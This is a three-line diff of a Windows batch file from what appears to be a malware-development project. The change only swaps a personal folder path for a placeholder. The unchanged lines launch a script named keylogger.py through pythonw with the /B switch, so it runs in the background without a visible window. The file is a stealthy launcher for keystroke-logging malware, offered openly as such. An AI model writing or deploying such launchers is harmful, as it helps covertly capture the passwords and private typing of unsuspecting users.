@@ -1,3 +1,3 @@
 @echo off
-cd C:\Users\User\Desktop\halkano project\malwaredev\
+cd C:\path\to\folder\containing\keyloger\
 start "keyloger" /B pythonw keylogger.py
